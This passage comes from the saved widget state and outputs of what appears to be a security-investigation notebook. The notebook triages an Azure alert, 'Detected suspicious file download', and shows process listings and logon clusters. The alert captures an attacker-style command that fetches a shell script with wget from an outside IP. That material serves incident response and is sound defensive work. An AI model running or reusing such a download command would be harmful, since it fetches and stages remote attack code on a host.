--type=utility --field-trial-handl...   \n...                                                                                                   ...   \n1036  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1038  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=gpu-process --field-trial-h...   \n1039                                                                                         netstat  -an   \n1040  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1041  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1042  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --field-trial-hand...   \n1043  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1044  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1045  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1046  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1047  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1048  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1049  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1050  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1051  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1052  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1053  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1054  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1061  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n1315                                                                     \"C:\\Windows\\system32\\mstsc.exe\"    \n1316  \"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0...   \n1333                                                                                  ping  microsoft.com   \n1433                                                      C:\\Windows\\System32\\InstallAgent.exe -Embedding   \n1458                    C:\\Windows\\system32\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}   \n1459                    C:\\Windows\\system32\\DllHost.exe /Processid:{49F6E667-6658-4BD1-9DE9-6AF87F9FAF85}   \n1462                                  \"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\taskschd.msc\" /s   \n1648                                                     C:\\Windows\\System32\\ie4uinit.exe -ClearIconCache   \n1650                                                       \"C:\\Windows\\System32\\unregmp2.exe\" /FirstLogon   \n1654  C:\\Windows\\system32\\RunDll32.exe C:\\Windows\\system32\\migration\\WininetPlugin.dll,MigrateCacheFor...   \n1655  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.109\\Installer\\chrmstp.exe\" --configu...   \n1657                   \"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Windows\\System32\\iesetup.dll\",IEHardenAdmin   \n1658                    \"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Windows\\System32\\iesetup.dll\",IEHardenUser   \n1659                                       rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh   \n1661                                                             \"C:\\Windows\\system32\\ServerManager.exe\"    \n1665  \"C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe\" -ServerName:Ap...   \n1667                                                     C:\\Windows\\System32\\RuntimeBroker.exe -Embedding   \n1668                                                  C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup   \n1669                                                                                           sihost.exe   \n1671                                                 taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}   \n1674                                                        C:\\Windows\\system32\\ServerManagerLauncher.exe   \n1675                                                                     C:\\Windows\\system32\\userinit.exe   \n1677                                                                              C:\\Windows\\Explorer.EXE   \n1683                                                       \"C:\\Windows\\System32\\ie4uinit.exe\" -UserConfig   \n1684  \"C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe\" -ServerName:Cortana...   \n1688                                                   C:\\Windows\\system32\\SettingSyncHost.exe -Embedding   \n1689                                                          \"C:\\Windows\\System32\\fsquirt.exe\" -Register   \n1692                                                           C:\\Windows\\System32\\mobsync.exe -Embedding   \n1693  C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa4...   \n1694                                                               \"cmd.exe\" /s /k pushd \"C:\\Diagnostics\"   \n1695                                              \\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1   \n\n     TargetLogonId  \n282            0x0  \n358      0x1cfd78d  \n440      0x1cfd78d  \n454            0x0  \n455            0x0  \n456            0x0  \n457            0x0  \n458            0x0  \n469      0x1cfd78d  \n644      0x1cfd78d  \n645      0x1cfd78d  \n650            0x0  \n651            0x0  \n652            0x0  \n653            0x0  \n654            0x0  \n655            0x0  \n656            0x0  \n657            0x0  \n658            0x0  \n659            0x0  \n660            0x0  \n661            0x0  \n662            0x0  \n663            0x0  \n665            0x0  \n666            0x0  \n667            0x0  \n668            0x0  \n669            0x0  \n670            0x0  \n691            0x0  \n752      0x1cfd78d  \n801            0x0  \n802      0x1cfd78d  \n803            0x0  \n810            0x0  \n812      0x1cfd78d  \n844            0x0  \n848            0x0  \n849            0x0  \n852            0x0  \n857            0x0  \n858            0x0  \n859            0x0  \n860            0x0  \n861            0x0  \n862            0x0  \n865            0x0  \n866            0x0  \n...            ...  \n1036           0x0  \n1038           0x0  \n1039           0x0  \n1040           0x0  \n1041           0x0  \n1042           0x0  \n1043           0x0  \n1044           0x0  \n1045           0x0  \n1046           0x0  \n1047           0x0  \n1048           0x0  \n1049           0x0  \n1050           0x0  \n1051           0x0  \n1052           0x0  \n1053           0x0  \n1054           0x0  \n1061           0x0  \n1315           0x0  \n1316     0x1cfd78d  \n1333           0x0  \n1433     0x1cfd78d  \n1458     0x1cfd78d  \n1459     0x1cfd78d  \n1462           0x0  \n1648           0x0  \n1650           0x0  \n1654           0x0  \n1655           0x0  \n1657           0x0  \n1658           0x0  \n1659     0x1cfd78d  \n1661           0x0  \n1665     0x1cfd78d  \n1667     0x1cfd78d  \n1668     0x1cfd78d  \n1669     0x1cfd78d  \n1671     0x1cfd78d  \n1674     0x1cfd78d  \n1675     0x1cfd78d  \n1677           0x0  \n1683           0x0  \n1684     0x1cfd78d  \n1688     0x1cfd78d  \n1689           0x0  \n1692     0x1cfd78d  \n1693     0x1cfd78d  \n1694           0x0  \n1695           0x0  \n\n[154 rows x 3 columns]"
         },
         "metadata": {},
         "output_type": "display_data"
        }
       ]
      }
     },
     "21187d2070d7427c86308c65da3c2891": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "23810ecd80fb4708920aa309260757a8": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "25a8693c20bc497b90ec1bc01be1eb3b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "2b056e3ad9774f9dbe1cc0db990d2432": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_630b08a76fdd4e759b8d896a3aac3d4c",
        "IPY_MODEL_a66add71a1fc4b999f7b2cfe8e811865"
       ],
       "layout": "IPY_MODEL_96ebd1e7634e4647953d2027fcca088c"
      }
     },
     "32075a4cfc084ffbbf20f158b384aa9e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "34767f71e11a4e8fa29407e2c48656c4": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_c3c2d8b6a53244cfbc722607bdbe4089",
       "style": "IPY_MODEL_470d56674acf4713abb1cd3b81140b64",
       "value": "<h4>Set time bounds for alert host - at least 1hr either side of the alert</h4>"
      }
     },
     "3eac9e6184d74823ae1141848404dca0": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_ef96ea59eb4f4d7e887601723024c9fa",
       "outputs": [
        {
         "data": {
          "text/html": "\n        <h3>Alert: 'Detected suspicious file download'</h3><br>time=<b>2019-02-16 03:23:54</b>, entity=<b>MSTICALERTSLXVM2</b>, id=<b>2518520133657099999_384e00d0-4afc-4e9a-8935-bec64d3951a4</b>\n        <br/>\n        <table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>5</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>TenantId</th>\n      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n    </tr>\n    <tr>\n      <th>StartTimeUtc</th>\n      <td>2019-02-16 03:23:54</td>\n    </tr>\n    <tr>\n      <th>EndTimeUtc</th>\n      <td>2019-02-16 03:23:54</td>\n    </tr>\n    <tr>\n      <th>ProviderAlertId</th>\n      <td>384e00d0-4afc-4e9a-8935-bec64d3951a4</td>\n    </tr>\n    <tr>\n      <th>SystemAlertId</th>\n      <td>2518520133657099999_384e00d0-4afc-4e9a-8935-bec64d3951a4</td>\n    </tr>\n    <tr>\n      <th>ProviderName</th>\n      <td>Detection</td>\n    </tr>\n    <tr>\n      <th>VendorName</th>\n      <td>Microsoft</td>\n    </tr>\n    <tr>\n      <th>AlertType</th>\n      <td>Detected suspicious file download</td>\n    </tr>\n    <tr>\n      <th>AlertName</th>\n      <td>Detected suspicious file download</td>\n    </tr>\n    <tr>\n      <th>AlertDisplayName</th>\n      <td>Detected suspicious file download</td>\n    </tr>\n    <tr>\n      <th>Description</th>\n      <td>Analysis of host data has detected suspicious download of remote file on MSTICALERTSLXVM2.</td>\n    </tr>\n    <tr>\n      <th>Severity</th>\n      <td>Low</td>\n    </tr>\n    <tr>\n      <th>IsIncident</th>\n      <td>False</td>\n    </tr>\n    <tr>\n      <th>ExtendedProperties</th>\n      <td>{'Compromised Host': 'MSTICALERTSLXVM2', 'User Name': 'dbadmin', 'Account Session Id': '0x2e8cf'...</td>\n    </tr>\n    <tr>\n      <th>Entities</th>\n      <td>[{'$id': '4', 'DnsDomain': '', 'NTDomain': '', 'HostName': 'MSTICALERTSLXVM2', 'NetBiosName': 'M...</td>\n    </tr>\n    <tr>\n      <th>ConfidenceLevel</th>\n      <td>Unknown</td>\n    </tr>\n    <tr>\n      <th>ConfidenceScore</th>\n      <td>NaN</td>\n    </tr>\n    <tr>\n      <th>ExtendedLinks</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>WorkspaceSubscriptionId</th>\n      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n    </tr>\n    <tr>\n      <th>WorkspaceResourceGroup</th>\n      <td>asihuntomsworkspacerg</td>\n    </tr>\n    <tr>\n      <th>TimeGenerated</th>\n      <td>2019-02-16 03:24:04</td>\n    </tr>\n    <tr>\n      <th>ResourceId</th>\n      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/provide...</td>\n    </tr>\n    <tr>\n      <th>SourceComputerId</th>\n      <td>44623fb0-bd5f-49ea-84d1-56aa11ab8a25</td>\n    </tr>\n    <tr>\n      <th>CompromisedEntity</th>\n      <td>MSTICALERTSLXVM2</td>\n    </tr>\n  </tbody>\n</table><br/><h3>ExtendedProperties:</h3><table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>0</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>Compromised Host</th>\n      <td>MSTICALERTSLXVM2</td>\n    </tr>\n    <tr>\n      <th>User Name</th>\n      <td>dbadmin</td>\n    </tr>\n    <tr>\n      <th>Account Session Id</th>\n      <td>0x2e8cf</td>\n    </tr>\n    <tr>\n      <th>Suspicious Process</th>\n      <td>/usr/bin/wget</td>\n    </tr>\n    <tr>\n      <th>Suspicious Command Line</th>\n      <td>wget http://13.67.35.176/QuZYpObins.sh -t 3 -T 5</td>\n    </tr>\n    <tr>\n      <th>Suspicious Process Id</th>\n      <td>0x4e55</td>\n    </tr>\n    <tr>\n      <th>resourceType</th>\n      <td>Virtual Machine</td>\n    </tr>\n    <tr>\n      <th>ServiceId</th>\n      <td>14fa08c7-c48e-4c18-950c-8148024b4398</td>\n    </tr>\n    <tr>\n      <th>ReportingSystem</th>\n      <td>Azure</td>\n    </tr>\n    <tr>\n      <th>OccuringDatacenter</th>\n      <td>eastus</td>\n    </tr>\n  </tbody>\n</table><h3>Entity counts: </h3>host: 1, process: 2, account: 1, file: 1, hostlogonsession: 1",
          "text/plain": "<IPython.core.display.HTML object>"
         },
         "metadata": {},
         "output_type": "display_data"
        },
        {
         "name": "stdout",
         "output_type": "stream",
         "text": "{ 'HostName': 'MSTICALERTSLXVM2',\n  'NetBiosName': 'MSTICALERTSLXVM2',\n  'OSFamily': 'Linux',\n  'Type': 'host'}\n{ 'Host': { 'HostName': 'MSTICALERTSLXVM2',\n            'NetBiosName': 'MSTICALERTSLXVM2',\n            'OSFamily': 'Linux',\n            'Type': 'host'},\n  'ProcessId': '0x4e4f',\n  'Type': 'process'}\n{ 'Host': { 'HostName': 'MSTICALERTSLXVM2',\n            'NetBiosName': 'MSTICALERTSLXVM2',\n            'OSFamily': 'Linux',\n            'Type': 'host'},\n  'LogonId': '0x2e8cf',\n  'Name': 'dbadmin',\n  'Sid': '1001:1001',\n  'Type': 'account'}\n{'Directory': '/usr/bin', 'FullPath': '/usr/bin/wget', 'Name': 'wget', 'Type': 'file'}\n{ 'Account': { 'Host': { 'HostName': 'MSTICALERTSLXVM2',\n                         'NetBiosName': 'MSTICALERTSLXVM2',\n                         'OSFamily': 'Linux',\n                         'Type': 'host'},\n               'LogonId': '0x2e8cf',\n               'Name': 'dbadmin',\n               'Sid': '1001:1001',\n               'Type': 'account'},\n  'CommandLine': 'wget http://13.67.35.176/QuZYpObins.sh -t 3 -T 5',\n  'CreationTimeUtc': '2019-02-16T03:23:54.29Z',\n  'Host': { 'HostName': 'MSTICALERTSLXVM2',\n            'NetBiosName': 'MSTICALERTSLXVM2',\n            'OSFamily': 'Linux',\n            'Type': 'host'},\n  'ImageFile': { 'Directory': '/usr/bin',\n                 'FullPath': '/usr/bin/wget',\n                 'Name': 'wget',\n                 'Type': 'file'},\n  'ParentProcess': { 'Host': { 'HostName': 'MSTICALERTSLXVM2',\n                               'NetBiosName': 'MSTICALERTSLXVM2',\n                               'OSFamily': 'Linux',\n                               'Type': 'host'},\n                     'ProcessId': '0x4e4f',\n                     'Type': 'process'},\n  'ProcessId': '0x4e55',\n  'Type': 'process'}\n{ 'Account': { 'Host': { 'HostName': 'MSTICALERTSLXVM2',\n                         'NetBiosName': 'MSTICALERTSLXVM2',\n                         'OSFamily': 'Linux',\n                         'Type': 'host'},\n               'LogonId': '0x2e8cf',\n               'Name': 'dbadmin',\n               'Sid': '1001:1001',\n               'Type': 'account'},\n  'EndTimeUtc': '2019-02-16T03:23:54.29Z',\n  'Host': { 'HostName': 'MSTICALERTSLXVM2',\n            'NetBiosName': 'MSTICALERTSLXVM2',\n            'OSFamily': 'Linux',\n            'Type': 'host'},\n  'SessionId': '0x2e8cf',\n  'StartTimeUtc': '2019-02-16T03:23:54.29Z',\n  'Type': 'hostlogonsession'}\n"
        }
       ]
      }
     },
     "40cea5745bf7422c9d459b52c6512d0a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "460bfb371f5b4dc2a819b37232d61547": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "470d56674acf4713abb1cd3b81140b64": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "4b082aceafa64913b117d3b0fca5d6b2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (hour):",
       "layout": "IPY_MODEL_d0546b64ddab46038dbbd2017f71240f",
       "max": 24,
       "min": -48,
       "style": "IPY_MODEL_8f2e07cb42394ae4aa54950a2327535f",
       "value": [
        -2,
        1
       ]
      }
     },
     "4bdf548ab6f44d569ad5e01172eefb2d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "55809e48fed541e29ded33c347e1d7d8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "5795a270a2f245fda15d0b323e0106c7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "5b6435aadb8d4e65a0274d91cc41e28d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_7c6216b3ffa5434db9df7bae246c82ad",
       "style": "IPY_MODEL_003d026b005741d8ab05f61f770304fa",
       "value": "2019-02-16 04:23:54"
      }
     },
     "60b8c51979c64ee4b1545523de0c5ca5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "60c005a8a0924286b2a7cd06f59457ea": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "630b08a76fdd4e759b8d896a3aac3d4c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_c4ef515eec0248e08ca1c93fe07d25a6",
       "style": "IPY_MODEL_0c13059b8c4d4c6cb7de3a9fb3dc04a6",
       "value": {
        "date": 16,
        "month": 1,
        "year": 2019
       }
      }
     },
     "653ac1c55c2941a092977660b8b2e142": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_0ddeed6885da4bc29b6bec7e0a5845cd",
       "style": "IPY_MODEL_55809e48fed541e29ded33c347e1d7d8",
       "value": "02:12:57.717406"
      }
     },
     "678036be13354ccea16934cafbac1a0e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "95%"
      }
     },
     "6a4c2fb60f484ef8bc06636bdff2cbf5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_4b082aceafa64913b117d3b0fca5d6b2",
        "IPY_MODEL_a4f6fb993e044d2bbf11473bd70f7583",
        "IPY_MODEL_5b6435aadb8d4e65a0274d91cc41e28d"
       ],
       "layout": "IPY_MODEL_4bdf548ab6f44d569ad5e01172eefb2d"
      }
     },
     "6b030b8c0d3941d280d1c7db3856632b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "78f4689da337493aba8d3990753bebee": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "7937726ea1524135916497fccf746586": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter alerts by title:",
       "layout": "IPY_MODEL_fcd42225da6949f8b17d48c697ba2f4f",
       "style": "IPY_MODEL_460bfb371f5b4dc2a819b37232d61547"
      }
     },
     "7ae5262f431a443badc30f0d6708811d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "7c6216b3ffa5434db9df7bae246c82ad": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "82ac6b9543eb497396305f47f2607c21": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_dcda9745cff5490bb5f377ba91a4bc37",
       "outputs": [
        {
         "ename": "NameError",
         "evalue": "name 'iplocation' is not defined",
         "output_type": "error",
         "traceback": [
          "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
          "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
          "\u001b[1;32m~\\AppData\\Roaming\\Python\\Python37\\site-packages\\msticpy\\nbtools\\nbwidgets.py\u001b[0m in \u001b[0;36m_select_alert\u001b[1;34m(self, selection)\u001b[0m\n\u001b[0;32m    363\u001b[0m                     \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_w_output\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mclear_output\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    364\u001b[0m                     \u001b[1;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_w_output\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 365\u001b[1;33m                         \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0malert_action\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mselected_alert\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    366\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    367\u001b[0m     \u001b[1;32mdef\u001b[0m \u001b[0m_get_alert\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mself\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0malert_id\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
          "\u001b[1;32m<ipython-input-15-6ad592877054>\u001b[0m in \u001b[0;36mshow_full_alert\u001b[1;34m(selected_alert)\u001b[0m\n\u001b[0;32m     11\u001b[0m     \u001b[1;32mglobal\u001b[0m \u001b[0msecurity_alert\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0malert_ip_entities\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     12\u001b[0m     \u001b[0msecurity_alert\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mmas\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mSecurityAlert\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0malert_select\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mselected_alert\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 13\u001b[1;33m     \u001b[0malert_ip_entities\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mget_alert_ips\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0msecurity_alert\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     14\u001b[0m     \u001b[0mmas\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdisp\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdisplay_alert\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0msecurity_alert\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mshow_entities\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;32mTrue\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     15\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
          "\u001b[1;32m<ipython-input-15-6ad592877054>\u001b[0m in \u001b[0;36mget_alert_ips\u001b[1;34m(alert)\u001b[0m\n\u001b[0;32m     23\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     24\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0maddl_ip_addrs\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 25\u001b[1;33m         \u001b[0m_\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mip_entities\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0miplocation\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mlookup_ip\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mip_addr_list\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0maddl_ip_addrs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     26\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     27\u001b[0m         \u001b[0mcurrent_ips\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;33m[\u001b[0m\u001b[0me\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mAddress\u001b[0m \u001b[1;32mfor\u001b[0m \u001b[0me\u001b[0m \u001b[1;32min\u001b[0m \u001b[0malert_ip_entities\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
          "\u001b[1;31mNameError\u001b[0m: name 'iplocation' is not defined"
         ]
        }
       ]
      }
     },
     "866e663650c64c6285956758c0367bdb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter alerts by title:",
       "layout": "IPY_MODEL_d8fcc0dcac3b403696a7ffca50bd3574",
       "style": "IPY_MODEL_ebf397681d5549ce83f8882da2348827"
      }
     },
     "8b2462c29f474ef7aca5a5322013ad80": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "MSTICAdmin:    (logontype=3)   timerange=2019-02-12 20:19:39.900000 - 2019-02-12 04:38:21.370000    count=8.0",
        "MSTICAdmin:    (logontype=10)   timerange=2019-02-12 20:19:44.767000 - 2019-02-15 03:57:02.593000    count=2.0",
        "SYSTEM:    (logontype=0)   timerange=2019-02-14 04:20:54.370000 - 2019-02-12 04:40:03.870000    count=2.0",
        "NETWORK SERVICE:    (logontype=5)   timerange=2019-02-14 04:20:54.630000 - 2019-02-12 04:40:04.207000    count=4.0",
        "DWM-1:    (logontype=2)   timerange=2019-02-14 04:20:54.773000 - 2019-02-12 04:40:04.483000    count=16.0",
        "LOCAL SERVICE:    (logontype=5)   timerange=2019-02-14 04:20:54.803000 - 2019-02-12 04:40:04.573000    count=2.0",
        "IUSR:    (logontype=5)   timerange=2019-02-14 04:20:56.110000 - 2019-02-12 04:40:12.360000    count=2.0",
        "MSTICAdmin:    (logontype=4)   timerange=2019-02-14 11:51:37.603000 - 2019-02-11 11:48:25.733000    count=16.0",
        "ian:    (logontype=10)   timerange=2019-02-16 03:24:49.500000 - 2019-02-15 19:54:24.590000    count=4.0",
        "SYSTEM:    (logontype=5)   timerange=2019-02-17 02:56:17.830000 - 2019-02-12 04:44:35.143000    count=139.0"
       ],
       "description": "Select logon cluster to examine",
       "index": 8,
       "layout": "IPY_MODEL_1a90f5957178446fac952202963ea805",
       "style": "IPY_MODEL_e693a044603d4edfaa1d04fe165871ca"
      }
     },
     "8b6ef86a3249411d914cbe232cf9e41a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_b5e8109bec0f4e428f955db156d401d3",
        "IPY_MODEL_996a705d3cce48ed98fa006f287fe8fb",
        "IPY_MODEL_95cfabbadff3402294fb0a9d4fb2ff43"
       ],
       "layout": "IPY_MODEL_9c2c91f36f974e8b869f9a7a0abc7782"
      }
     },
     "8f2e07cb42394ae4aa54950a2327535f": {
